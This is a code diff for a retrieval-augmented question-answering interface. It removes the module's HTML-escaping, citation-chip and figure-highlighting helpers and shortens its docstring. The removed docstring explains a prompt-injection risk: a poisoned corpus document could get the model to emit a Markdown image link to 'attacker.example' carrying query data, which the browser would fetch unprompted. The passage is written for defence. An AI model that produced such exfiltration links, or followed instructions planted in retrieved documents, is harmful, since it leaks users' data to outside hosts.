@@ -1,21 +1,13 @@
-"""What an answer looks like on screen, computed without Streamlit (features 37, 54-56, 62, 63).
+"""What an answer means on screen, computed without Streamlit (features 37, 55, 56, 62, 63).
 
-Everything here is a plain function of an answer, so the rules the interface enforces - how a
-citation is drawn, which evidence band applies, what a refusal says - are tested directly
-rather than by clicking through a browser.
-
-Model output is untrusted. It can echo retrieved text, and a document in the corpus could
-carry adversarial content (feature 43), so answer text is escaped before any markup is added:
-nothing the model writes can become HTML. Markdown images are removed as well. A poisoned
-document could ask the model to emit ``![](https://attacker.example/?q=...)``, and rendering
-that would make the reader's browser send the request - a known exfiltration route in RAG
-interfaces that no click is needed to trigger.
+Everything here is a plain function of an answer - which evidence band applies, what a refusal
+is called, what the timings read as, what the transcript records - so the rules the interface
+enforces are tested directly rather than by clicking through a browser. Turning those
+decisions into elements is ``markup``'s job; rendering them is ``app``'s.
 """
 
 from __future__ import annotations
 
-import html
-import re
 from dataclasses import dataclass
 from datetime import datetime
 from typing import Literal
@@ -23,38 +15,8 @@ from typing import Literal
 from citara.config import UiSettings
 from citara.generation.models import Citation, GeneratedAnswer
 
-_MARKER = re.compile(r"\[(\d+)\]")
-# A marker with the punctuation that follows it, kept together so a chip that wraps to the
-# next line does not leave its full stop stranded at the start of the line after.
-_MARKER_WITH_PUNCTUATION = re.compile(r"\[(\d+)\]([.,;:!?]?)")
-_MARKDOWN_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
-
-# Figures an officer would check against the cited page: money, large counts, scaled amounts,
-# percentages and temperatures. Bare small numbers are left alone - marking every "3" would
-# be noise, and a highlight that means everything means nothing.
-_FIGURE = re.compile(
-    r"(?:PKR|Rs\.?|USD|US\$|\$)\s?\d[\d,]*(?:\.\d+)?(?:\s?(?:million|billion|trillion))?"
-    r"|\b\d{1,3}(?:,\d{3})+(?:\.\d+)?\b"
-    r"|\b\d+(?:\.\d+)?\s?(?:million|billion|trillion)\b"
-    r"|\b\d+(?:\.\d+)?\s?(?:%|per ?cent)"
-    r"|\b\d+(?:\.\d+)?\s?(?:\u00b0\s?C|\u2103)",
-    re.IGNORECASE,
-)
-# Chips are set aside while figures are marked, so the digits inside a citation are never
-# mistaken for a figure. The token carries a letter prefix so no word boundary precedes it.
-_STASHED = re.compile(r"\x00chip(\d+)\x00")
-
 Band = Literal["High", "Moderate", "Low"]
 NoticeKind = Literal["refusal", "degraded", "blocked", "scope", "limit"]
-
-
-def safe_markdown(text: str) -> str:
-    """Model or document text made safe to render as Markdown.
-
-    HTML is escaped, and images keep their alt text but lose the request that would load
-    them.
-    """
-    return html.escape(_MARKDOWN_IMAGE.sub(r"\1", text), quote=False)
 
 
 def pages(citation: Citation) -> str:
@@ -62,43 +24,6 @@ def pages(citation: Citation) -> str:
     if citation.page_start == citation.page_end:
         return f"p. {citation.page_start}"
     return f"pp. {citation.page_start}-{citation.page_end}"
-
-
-def render_answer_html(answer: GeneratedAnswer) -> str:
-    """Answer text with each ``[n]`` replaced by a citation chip (feature 54).
-
-    The chip carries the marker and the page, so the source is legible inline on a phone,
-    where there is no hover; the full title is in the tooltip and in the source panel. A
-    marker pointing at evidence that does not exist is drawn as a warning rather than
-    silently dropped. Figures are marked in the same pass (feature 60): the number is usually
-    what the reader came for, and what they will verify against the page.
-    """
-    by_marker = {citation.marker: citation for citation in answer.citations}
-
-    def chip(match: re.Match[str]) -> str:
-        marker, punctuation = int(match.group(1)), match.group(2)
-        citation = by_marker.get(marker)
-        if citation is None:
-            drawn = (
-                f'<span class="cite-chip cite-invalid" title="Evidence [{marker}] does not '
-                f'exist; this claim is unsupported">{marker}?</span>'
-            )
-        else:
-            title = html.escape(citation.citation)
-            drawn = f'<span class="cite-chip" title="{title}">{marker} · {pages(citation)}</span>'
-        if punctuation:
-            return f'<span class="cite-tail">{drawn}{punctuation}</span>'
-        return drawn
-
-    stashed: list[str] = []
-
-    def stash(match: re.Match[str]) -> str:
-        stashed.append(chip(match))
-        return f"\x00chip{len(stashed) - 1}\x00"
-
-    text = _MARKER_WITH_PUNCTUATION.sub(stash, safe_markdown(answer.text))
-    text = _FIGURE.sub(lambda m: f'<span class="figure">{m.group(0)}</span>', text)
-    return _STASHED.sub(lambda m: stashed[int(m.group(1))], text)
 
 
 def evidence_band(answer: GeneratedAnswer, ui: UiSettings) -> Band | None:
